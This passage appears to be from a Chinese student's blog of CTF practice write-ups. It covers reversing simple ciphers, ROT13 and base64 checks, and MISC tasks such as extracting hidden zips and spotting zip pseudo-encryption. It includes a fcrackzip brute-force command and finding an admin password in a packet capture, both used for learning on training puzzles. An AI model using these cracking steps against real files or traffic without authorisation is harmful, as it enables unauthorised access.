[esp+27h] [ebp-31h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v6; <span class="comment">// [esp+28h] [ebp-30h]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [esp+29h] [ebp-2Fh]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [esp+2Dh] [ebp-2Bh]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [esp+31h] [ebp-27h]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [esp+35h] [ebp-23h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v11; <span class="comment">// [esp+39h] [ebp-1Fh]</span></span><br><span class="line">  <span class="type">char</span> v12[<span class="number">29</span>]; <span class="comment">// [esp+3Bh] [ebp-1Dh] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(v12, <span class="string">&quot;Qsw3sj_lz4_Ujw@l&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input:&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;v2);</span><br><span class="line">  result = v2;</span><br><span class="line">  <span class="keyword">if</span> ( v2 == <span class="string">&#x27;A&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = v3;</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="string">&#x27;C&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      result = v4;</span><br><span class="line">      <span class="keyword">if</span> ( v4 == <span class="string">&#x27;T&#x27;</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        result = v5;</span><br><span class="line">        <span class="keyword">if</span> ( v5 == <span class="string">&#x27;F&#x27;</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          result = v6;</span><br><span class="line">          <span class="keyword">if</span> ( v6 == <span class="string">&#x27;&#123;&#x27;</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            result = v11;</span><br><span class="line">            <span class="keyword">if</span> ( v11 == <span class="string">&#x27;&#125;&#x27;</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              v1[<span class="number">0</span>] = v7;</span><br><span class="line">              v1[<span class="number">1</span>] = v8;</span><br><span class="line">              v1[<span class="number">2</span>] = v9;</span><br><span class="line">              v1[<span class="number">3</span>] = v10;</span><br><span class="line">              *(_DWORD *)&amp;v12[<span class="number">17</span>] = <span class="number">0</span>;</span><br><span class="line">              <span class="keyword">while</span> ( *(<span class="type">int</span> *)&amp;v12[<span class="number">17</span>] &lt;= <span class="number">15</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="keyword">if</span> ( *((<span class="type">char</span> *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) &gt; <span class="number">64</span> &amp;&amp; *((<span class="type">char</span> *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) &lt;= <span class="number">90</span> )<span class="comment">//大写字母处理</span></span><br><span class="line">                  *((_BYTE *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) = (*((<span class="type">char</span> *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) - <span class="number">51</span>) % <span class="number">26</span> + <span class="number">65</span>;</span><br><span class="line">                <span class="keyword">if</span> ( *((<span class="type">char</span> *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) &gt; <span class="number">96</span> &amp;&amp; *((<span class="type">char</span> *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) &lt;= <span class="number">122</span> )<span class="comment">//小写字母处理</span></span><br><span class="line">                  *((_BYTE *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) = (*((<span class="type">char</span> *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) - <span class="number">79</span>) % <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line">                ++*(_DWORD *)&amp;v12[<span class="number">17</span>];</span><br><span class="line">              &#125;</span><br><span class="line">              *(_DWORD *)&amp;v12[<span class="number">17</span>] = <span class="number">0</span>;</span><br><span class="line">              <span class="keyword">while</span> ( *(<span class="type">int</span> *)&amp;v12[<span class="number">17</span>] &lt;= <span class="number">15</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                result = (<span class="type">unsigned</span> __int8)v12[*(_DWORD *)&amp;v12[<span class="number">17</span>]];</span><br><span class="line">                <span class="keyword">if</span> ( *((_BYTE *)v1 + *(_DWORD *)&amp;v12[<span class="number">17</span>]) != (_BYTE)result )</span><br><span class="line">                  <span class="keyword">return</span> result;</span><br><span class="line">                ++*(_DWORD *)&amp;v12[<span class="number">17</span>];</span><br><span class="line">              &#125;</span><br><span class="line">              result = <span class="built_in">printf</span>(<span class="string">&quot;You are correct!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>第一个while循环<br>65-90的数，第二个循环是97-122的数，对大小写字母分别加密<br>第二个while循环是比较</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="string">&#x27;ACTF&#x27;</span></span><br><span class="line">v12=<span class="string">&#x27;Qsw3sj_lz4_Ujw@l&#x27;</span></span><br><span class="line">s=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(v12)):</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">        i=s</span><br><span class="line">        <span class="keyword">if</span> (i&gt;<span class="number">64</span> <span class="keyword">and</span> i&lt;=<span class="number">90</span>):</span><br><span class="line">            i = (i-<span class="number">51</span>)%<span class="number">26</span>+<span class="number">65</span></span><br><span class="line">        <span class="keyword">if</span>(i&gt;<span class="number">96</span> <span class="keyword">and</span> i&lt;=<span class="number">122</span>):</span><br><span class="line">            i = (i-<span class="number">79</span>)%<span class="number">26</span>+<span class="number">97</span></span><br><span class="line">        <span class="keyword">if</span> i ==<span class="built_in">ord</span>(v12[k]):<span class="comment">#第二个循环的比较</span></span><br><span class="line">            a = a+<span class="built_in">chr</span>(s)</span><br><span class="line"><span class="built_in">print</span>(a+<span class="string">&#x27;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<p>跑出来的脚本再包上flag<br>###flag{Cae3ar_th4_Gre@t}</p>
<h2 id="CrackRTF-1"><a href="#CrackRTF-1" class="headerlink" title="CrackRTF"></a>CrackRTF</h2><p>看了writeup知道这道题是与winapi有关的题目，两个加密检验的部分</p>
<blockquote>
<p>strcat()函数是字符串的拼接</p>
</blockquote>
<p>进入主函数开始分析<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1661702071873-ab533a64-eddd-44c4-8904-60524fcf2f6e.png"
                      alt="image.png"
                ><br>先分析第一段，输入字符Destination，判断长度是否是6，感觉没啥，继续往下读，往下读发现读不通了，全是粉色的函数<br>点进sub_40100A函数中会发现更多的粉色函数，直接上网搜每一个函数大概是什么意思<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1661758098300-4e6bc0fe-b10f-49ea-8194-6f86053d1a70.png"
                      alt="image.png"
                ></p>
<blockquote>
<p>CryptAcquireContextA：连接CSP，获得指定CSP的密钥容器的句柄<br>CryptCreateHash：启动数据流的散列。它创建并向调用应用程序返回加密服务提供程序 (CSP) 哈希对象的句柄。此句柄用于后续调用 CryptHashData 和 CryptHashSessionKey 以散列会话密钥和其他数据流。<br>CryptHashData：将数据添加到指定的哈希对象。可以多次调用此函数和 CryptHashSessionKey 来计算长数据流或不连续数据流的哈希值。<br>CryptGetHashParam：检索控制散列对象操作的数据。可以使用此函数检索实际散列值。<br>wsprintfA：将一系列的字符和数值输入到缓冲区。输出缓冲区里的的值取决于格式说明符（即”%”）。<br>lstrcatA：该函数将字符串lpString2附加在另一个字符串lpString1后面。<br>CryptDestroyHash：销毁由 hHash 参数引用的哈希对象。散列对象被销毁后，就不能再使用了。<br>CryptReleaseContext：释放加密服务提供程序 (CSP) 和密钥容器的句柄。</p>
</blockquote>
<p>后面将Destination和”@DBApp”,v3赋值为Destination的长度，<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1661702243369-25108d63-83b0-4459-9e61-23b61c8f2cb7.png"
                      alt="1661702238317.png"
                ></p>
<h2 id="FlareOn4-login"><a href="#FlareOn4-login" class="headerlink" title="[FlareOn4]login"></a>[FlareOn4]login</h2><h3 id="M1–读代码解密"><a href="#M1–读代码解密" class="headerlink" title="M1–读代码解密"></a>M1–读代码解密</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1661860855486-768ab726-79f5-4b33-a66d-56e22d7c4f66.png"
                      alt="image.png"
                ><br>下载好了之后是这样的两个文件，<br>打开Description.txt文本文件给了flag的格式是以邮箱的形式<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1662214046748-180f4c6d-4904-48f0-a936-a06d4f498dc0.png"
                      alt="image.png"
                ><br>打开login.html文件可以发现下面的源代码里有加密的代码逻辑如下</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;prompt&quot;</span>).<span class="property">onclick</span> = <span class="keyword">function</span> (<span class="params"></span>) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">var</span> flag = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;flag&quot;</span>).<span class="property">value</span>;</span><br><span class="line">    <span class="keyword">var</span> rotFlag = flag.<span class="title function_">replace</span>(</span><br><span class="line">        <span class="regexp">/[a-zA-Z]/g</span>, </span><br><span class="line">    <span class="keyword">function</span>(<span class="params">c</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>((c &lt;= <span class="string">&quot;Z&quot;</span> ? <span class="number">90</span> : <span class="number">122</span>) &gt;= (c = c.<span class="title function_">charCodeAt</span>(<span class="number">0</span>) + <span class="number">13</span>) ? c : c - <span class="number">26</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;PyvragFvqrYbtvafNerRnfl@syner-ba.pbz&quot;</span> == rotFlag) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;Correct flag!&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;Incorrect flag, rot again&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;      </span><br></pre></td></tr></table></figure></div>

<p>看到一条关键信息的加密<br><code>String.fromCharCode((c &lt;= &quot;Z&quot; ? 90 : 122) &gt;= (c = c.charCodeAt(0) + 13) ? c : c - 26);</code><br>看上去是一个超级三目运算，输入的c经过加密后输出<br>这样看的话很烦看着，所以直接设未知字符串<br><code>enc1=(c &lt;= &quot;Z&quot; ? 90 : 122)</code>判断输入的字符是大写还是小写，并且对应着’z’的ascii’码<br><code>enc2=(c = c.charCodeAt(0) + 13)</code>将当前的字符的第一个字符的ASCII值+13再赋给enc2</p>
<blockquote>
<p>js的charCode()方法<br>返回字符串第一个字符的 Unicode 编码(H 的 Unicode 值):<br>e.g:<br><code>var str = &quot;HELLO WORLD&quot;; var n = str.charCodeAt(0); </code><br>输出结果：72<br>tips:<br>Unicode编码与Ascii编码之间的区别是一个是2个字节一个1个字节，统一为Unicode编码是为了不出现乱码的情况</p>
</blockquote>
<p>最后的三目运算就是<code>enc1&gt;=enc2?enc2:enc-26</code>最后加完的值大于等于当前的”Z”,如果是执行enc2，即是+13后的结果，如果不是的话就是-26，反过来用flag的字符就是-13后小于当前字符对应的A时，就+26，否则就-13，写脚本</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">enc = <span class="string">&#x27;PyvragFvqrYbtvafNerRnfl@syner-ba.pbz&#x27;</span></span><br><span class="line">flag =<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> enc: <span class="comment">#字符串的遍历 range(enc)是数组的遍历</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(i)&gt;=<span class="number">65</span> <span class="keyword">and</span> <span class="built_in">ord</span>(i)&lt;=<span class="number">90</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">ord</span>(i)-<span class="number">13</span>&lt;<span class="number">65</span>:</span><br><span class="line">            flag+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(i)+<span class="number">13</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flag+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(i)-<span class="number">13</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">ord</span>(i)&gt;=<span class="number">97</span> <span class="keyword">and</span> <span class="built_in">ord</span>(i)&lt;=<span class="number">122</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">ord</span>(i)-<span class="number">13</span>&lt;<span class="number">97</span>:</span><br><span class="line">            flag+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(i)+<span class="number">13</span>)</span><br><span class="line">        <span class="keyword">else</span>: </span><br><span class="line">            flag+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(i)-<span class="number">13</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag +=i</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></div>

<h3 id="M2–ROT13的利用"><a href="#M2–ROT13的利用" class="headerlink" title="M2–ROT13的利用"></a>M2–ROT13的利用</h3><p>没想啊，竟然是ROT13的加密<br>一个是+13一个是-26就是正巧是<strong>ROT-13。</strong><br>只受26个字母的影响，数字、符号、空白以及其他的所有字元都不变（ 英文字母的字符换成它13位之后的字符，越界之后再折回来）。<br>直接将获得的密文进行ROT13解码就行了,ASCII对照表可以方便数清字母之间相差的位数<br>ABCDEFGHIJKLMNOPQRSTUVWXYZ<br>NOPQRSTUVWXYZABCDEFGHIJKLM<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1662209789496-017a0694-4c4d-40e2-aa32-bfbe789258a8.png"
                      alt="ascii-1-1.png"
                ></p>
<p>flag{<a class="link"   href="mailto:&#x43;&#108;&#x69;&#101;&#x6e;&#116;&#83;&#105;&#x64;&#101;&#76;&#x6f;&#103;&#x69;&#110;&#x73;&#x41;&#114;&#x65;&#x45;&#x61;&#115;&#x79;&#64;&#x66;&#108;&#97;&#x72;&#101;&#45;&#x6f;&#110;&#46;&#x63;&#111;&#x6d;" >&#x43;&#108;&#x69;&#101;&#x6e;&#116;&#83;&#105;&#x64;&#101;&#76;&#x6f;&#103;&#x69;&#110;&#x73;&#x41;&#114;&#x65;&#x45;&#x61;&#115;&#x79;&#64;&#x66;&#108;&#97;&#x72;&#101;&#45;&#x6f;&#110;&#46;&#x63;&#111;&#x6d; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>}</p>
<h2 id="2019红帽杯-easyRE"><a href="#2019红帽杯-easyRE" class="headerlink" title="[2019红帽杯]easyRE"></a>[2019红帽杯]easyRE</h2><p>查看字符串，点进提示字符所在的函数之后发现在主函数的伪代码<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1662551734909-cedba906-28e7-4bc1-b45e-1b02cf1b6396.png"
                      alt="image.png"
                ><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1662214748813-9558d804-6a29-44fb-8e1d-47fe58b6c37a.png"
                      alt="image.png"
                ><br>经过大佬的讲解貌似是经过十次base64的加密，最后与后面的字符进行比较，比较成功就会显示”<code>You found me!!!</code>“</p>
<blockquote>
<p>b64decode()<br>将二进制字符串解码为正常形式</p>
</blockquote>
<h2 id="Youngter-drive"><a href="#Youngter-drive" class="headerlink" title="Youngter-drive"></a>Youngter-drive</h2><p>下载后发现是被upx加壳的文件，直接脱壳，而且是32位的，直接放在ida里进行分析<br>分析主函数<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1661945312814-078d0bf8-107e-4e8a-9a54-00c4b0c0eac7.png"
                      alt="image.png"
                ></p>
<h2 id="相册"><a href="#相册" class="headerlink" title="相册"></a>相册</h2><p>下载后是一个apk文件，放在模拟器里面发现打不开文件，所以直接使用GDA打开apk分析文件<br>查看所有字符后猜测是base64加密的，查看C2之后发现用到了NativeMethod方法，再进行base64的解密<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1661938137722-6dd547ee-bb01-431d-9ee3-af3399ee8616.png"
                      alt="image.png"
                ><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1661916238615-0f1592b7-7827-44c3-9149-01fcc7dbbadb.png"
                      alt="image.png"
                ></p>
<blockquote>
<h3 id="Native-Method"><a href="#Native-Method" class="headerlink" title="Native Method"></a>Native Method</h3><p>是一个java调用非java代码的接口，是由非java语言实现的。<br>我们可以在一个native method的本地实现中访问所有的java特性，但是这要依赖于你所访问的java特性的实现，而且这样做远远不如在java语言中使用那些特性方便和容易。<br>native method的存在并不会对其他类调用这些本地方法产生任何影响，实际上调用这些方法的其他类甚至不知道它所调用的是一个本地方法  </p>
</blockquote>
<p>找到.so文件右键导出（找了半天才找到怎么操作这个东西）<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1661937744017-b5c2e985-0e5c-45c6-b5aa-3dbf1b6fc20a.png"
                      alt="image.png"
                ><br>将.so文件放在ida32位里面进行分析，发现有三串感觉像是base64加密后的密文，直接用在线转换的工具转换。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1661937354194-28a9c728-d5b2-454c-8984-da89b413014a.png"
                      alt="image.png"
                ><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1661935336377-a0a88e90-58e5-40ba-b62e-beea3ebae138.png"
                      alt="image.png"
                ><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1661935357167-28c70bd1-237d-4902-b904-8f9a78d69caa.png"
                      alt="image.png"
                ><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1661935299862-de74f8ff-ad7f-470b-8015-2cc2bfb68fa9.png"
                      alt="image.png"
                ><br>后面按照题目的意思flag是一个邮箱，所以flag应该是<a class="link"   href="mailto:&#49;&#56;&#x32;&#x31;&#56;&#x34;&#x36;&#53;&#x31;&#50;&#x35;&#64;&#49;&#54;&#51;&#46;&#x63;&#x6f;&#109;" >&#49;&#56;&#x32;&#x31;&#56;&#x34;&#x36;&#53;&#x31;&#50;&#x35;&#64;&#49;&#54;&#51;&#46;&#x63;&#x6f;&#109; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，包上flag{}就正确了<br>###flag{<a class="link"   href="mailto:&#49;&#56;&#50;&#x31;&#x38;&#52;&#x36;&#x35;&#49;&#x32;&#x35;&#64;&#x31;&#x36;&#51;&#46;&#x63;&#111;&#109;" >&#49;&#56;&#50;&#x31;&#x38;&#52;&#x36;&#x35;&#49;&#x32;&#x35;&#64;&#x31;&#x36;&#51;&#46;&#x63;&#111;&#109; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>}</p>
<h1 id="BUUCTF平台MISC刷题20221217"><a href="#BUUCTF平台MISC刷题20221217" class="headerlink" title="BUUCTF平台MISC刷题20221217"></a>BUUCTF平台MISC刷题20221217</h1><h2 id="二维码"><a href="#二维码" class="headerlink" title="二维码"></a>二维码</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1660317261295-a9d084db-52c6-4799-873d-ec1c4fc09fb9.png"
                      alt="QR_code.png"
                ><br>下载后是一张照片，二维码的图片，直接用软件破解后填入是错的<br>直接将图片放入到010editor进行分析，发现这个图片里包含着压缩包，kali中的binwalk进行分离<br><code>binwalk -e xx.png</code><br>分离出压缩包且是加密的，使用爆破命令<br><code>fcrackzip -b -c 1 -l 4-4 -u /home/kali/Desktop/1D7.zip</code> 4-4是由于文件打开后的文本文件写的是4位数的密码所以是4，得到解压密码是7639 解压出来密码得到了flag文件<br>##flag{vjpw_wnoei}</p>
<h2 id="N种方法解决"><a href="#N种方法解决" class="headerlink" title="N种方法解决"></a>N种方法解决</h2><p>下载后的文件执行不了，直接拖入010editor中进行分析<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1660552763755-898f4d53-8e93-4968-bca1-dfde31bd9728.png"
                      alt="图片.png"
                >根据开头的data:image&#x2F;jpg;base64知道应该是将base64的编码转换成照片<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1660553049791-5d364ec4-9696-4f26-8980-3f8a0b3c14f2.png"
                      alt="图片.png"
                >二维码扫描工具<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1660553106148-2687340c-3cba-43ba-b364-38d7332f3472.png"
                      alt="图片.png"
                ><br>将KEY换成flag就好了<br>##flag{dca57f966e4e4e31fd5b15417da63269}</p>
<h2 id="大白"><a href="#大白" class="headerlink" title="大白"></a>大白</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1660557922955-7a5e5c91-3abb-4717-8db8-b56f15d6f07c.png"
                      alt="图片.png"
                ><br>显示屏幕太小，所以大概是长宽被改变了。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1660558027105-1829bbce-c9cf-4cea-a376-9ca142232f71.png"
                      alt="图片.png"
                >放入010之后也报了CRC错误，改变图片的高度与宽度相同 02 A7，得到flag<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1660558348423-4c023006-31a9-46b4-ae9c-d22ed8ad89fa.png"
                      alt="image.png"
                ><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1660558290673-81d4be09-ff39-4758-9569-38a57dcb7ff4.png"
                      alt="图片.png"
                ><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1660558263592-227951cc-b1b1-48d4-8f1f-54cfa66bea5a.png"
                      alt="图片.png"
                >###flag{He1l0_d4_ba1}</p>
<h2 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h2><p>根据题目的提示<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1660554925033-7f3d9ed9-2386-48dc-96be-e83f90f1a97d.png"
                      alt="图片.png"
                ><br>登录后的流量包是POST的，只有这一条是符合条件的<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1660554967415-ba6d10fb-6577-4536-a963-b66d14676d2c.png"
                      alt="图片.png"
                ><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1660554993745-b72a5036-0af1-43b0-9fd3-34aa4654e43c.png"
                      alt="图片.png"
                >找到管理员的密码得到flag<br>###flag{ffb7567a1d4f4abdffdb54e022f8facd&amp;captcha}</p>
<h2 id="rar"><a href="#rar" class="headerlink" title="rar"></a>rar</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1660555141806-aeb289a2-9358-4c6b-899d-37e306592fe6.png"
                      alt="图片.png"
                ><br>下载后是一个压缩包，直接进行密码的爆破，4位纯数字，设置好后等待，接触的密码是8795，打开加密的压缩文件得到flag<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1660555350775-76c965fd-9f1e-4c10-858b-6664943535d9.png"
                      alt="图片.png"
                ><br>###flag{1773c5da790bd3caff38e3decd180eb7}</p>
<h2 id="zip伪加密"><a href="#zip伪加密" class="headerlink" title="zip伪加密"></a>zip伪加密</h2><p>下载得到加密的压缩包，如果像上面的题目的话，我们是得不到密码的<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1660555547966-edff6b98-ca32-469c-872d-1479aade21b9.png"
                      alt="图片.png"
                ><br>放入010editor看看<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1660556172388-ac6b23d2-457c-4087-8955-976a8eda8a73.png"
                      alt="图片.png"
                >这里需要补充知识点<br>文件的头文件类型<br>一个 ZIP 文件由三个部分组成： 压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标志<br>1、压缩源文件数据区<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1660556206833-2abb5daa-bc47-4de7-b87d-6184172fe349.png"
                      alt="image.png"
                ><br>在这个数据区中每一个压缩的源文件&#x2F;目录都是一条记录，记录的格式如下：[文件头+ 文件数据 + 数据描述符]<br>a 文件头格式<br>组成    　                					长度</p>
<hr>
<p>文件头标记							4 bytes  (0x04034b50)<br>解压文件所需 pkware 版本			2 bytes<br>全局方式位标记						2 bytes<br>压缩方式							2 bytes<br>最后修改文件时间					2 bytes<br>最后修改文件日期					2 bytes<br>CRC-32校验							4 bytes<br>压缩后尺寸							4 bytes<br>未压缩尺寸							4 bytes<br>文件名长度							2 bytes<br>扩展记录长度						2 bytes<br>文件名								（不定长度）<br>扩展字段							（不定长度）<br>b、文件数据<br>c、数据描述符<br> 　　组成    　     			长度</p>
<hr>
<p>CRC-32校验                  4 bytes<br>  　　压缩后尺寸                   4 bytes<br> 　 　未压缩尺寸                   4 bytes<br>这个数据描述符只在全局方式位标记的第３位设为１时才存在（见后详解），紧接在压缩数据的最后一个字节后。这个数据描述符只用在不能对输出的 ZIP 文件进行检索时使用。例如：在一个不能检索的驱动器（如：磁带机上）上的 ZIP 文件中。如果是磁盘上的ZIP文件一般没有这个数据描述符。</p>
<pre><code> 2、压缩源文件目录区
</code></pre>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1660556611682-e0511f08-1d12-4e17-848f-c4bf68c22139.png"
                      alt="image.png"
                >在这个数据区中每一条纪录对应在压缩源文件数据区中的一条数据<br>组成               　            长度</p>
<hr>
<pre><code>　　目录中文件文件头标记             	4 bytes  (0x02014b50)
　　压缩使用的　pkware 版本          	2 bytes
　　解压文件所需 pkware 版本         	2 bytes
全局方式位标记                   		2 bytes
　　压缩方式                        			2 bytes
　　最后修改文件时间                		2 bytes
　　最后修改文件日期                 		2 bytes
　　ＣＲＣ－３２校验                 		4 bytes
　　压缩后尺寸                      			4 bytes
　　未压缩尺寸                      			4 bytes
　　文件名长度                      			2 bytes
　　扩展字段长度                    		2 bytes
　　文件注释长度                   	 	2 bytes
　　磁盘开始号                      			2 bytes
　　内部文件属性                    		2 bytes
　　外部文件属性                    		4 bytes
        局部头部偏移量                  			4 bytes
　　文件名                       			（不定长度）
　　扩展字段                     			（不定长度）
        文件注释                     				（不定长度）
</code></pre>
<p>–&gt;这里是有判断是否存在加密情况的判断点</p>
<h3 id="识别真假加密"><a href="#识别真假加密" class="headerlink" title="识别真假加密"></a>识别真假加密</h3><h4 id="无加密"><a href="#无加密" class="headerlink" title="无加密"></a>无加密</h4><p>压缩源文件数据区的全局加密应当为00 00<br>且压缩源文件目录区的全局方式位标记应当为00 00</p>
